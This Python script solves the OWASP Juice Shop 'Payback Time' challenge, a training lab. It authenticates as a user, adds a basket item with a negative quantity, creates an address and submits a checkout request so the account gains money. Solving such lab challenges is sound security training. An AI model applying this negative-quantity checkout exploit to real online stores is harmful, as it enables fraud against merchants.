"""
This file is used to solve the OWASP Juice-shop Task
PAYBACK TIME
Category: Improper Input Validation
GOAL: set the amount of sth in your basket to be negative
      after this you can checkout and gain money
METHODOLOGY:
step1. login to user A
    Hint: we can use the user created in repetitive registration
step2. Set the quantity of sth in your basket to be -1000000
setp3. Set address and checkout
"""

from plugins import basket as bt

class paybackTime(bt.manipulate_basket):

    def __init__(self):
        self.juice_session = bt.a.requests.session()
        print("please enter your email")
        self.email = input()
        self.userid = bt.a.get_userId(self.email)
        self.cookie, self.header = bt.a.get_auth(self.email)
        self.basketId = bt.a.get_basket_id(self.email)
        self.address_url = bt.a.URL + '/api/Addresss/'
        self.checkout_url = bt.a.URL + '/rest/basket/'+str(self.basketId)+'/checkout'
        

    def get_address(self):
        addressId = bt.a.get_userAddressId(self.email)
        if addressId:
            return addressId
        else: 
            addressId = self.set_address()
            return addressId


    def set_address(self):
        json_data = {
            'country': 'canada',
            'fullName': 'testadmin',
            'mobileNum': 123456789,
            'zipCode': '123456',
            'streetAddress': '5555 baper ave',
            'city': 'richmond',
            'state': 'BC',
        }
        response = self.juice_session.post(self.address_url, cookies=self.cookie, headers=self.header, json=json_data, verify=False)
        address_id = response.json()['data']['id']
        bt.a.set_userAddressId(self.email,address_id)
        return address_id

    def generator(self):
        addressId = self.get_address()
        json_data = {
            'couponData': 'bnVsbA==',
            'orderDetails': {
                'paymentId': 'wallet',
                'addressId': str(addressId),
                'deliveryMethodId': '3',
            },
        }
        return json_data


    def run(self):
        super().view_basket(self.basketId)
        super().addto_basket(quantity=-5)
        json_data = self.generator()
        response = self.juice_session.post(self.checkout_url, cookies=self.cookie, headers=self.header, json=json_data, verify=False)
        if response.status_code == 200:
            print("You have become richer!")

        # a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
        #                     level=a.logging.INFO, format='%(asctime)s %(message)s')
        # logger = a.logging.getLogger("Payback Time")
        # a.logging.info(logger)
        # a.logging.info('Started')
        # self.forged_feedback()
        # self.forged_review()
        # a.logging.info('Finished')
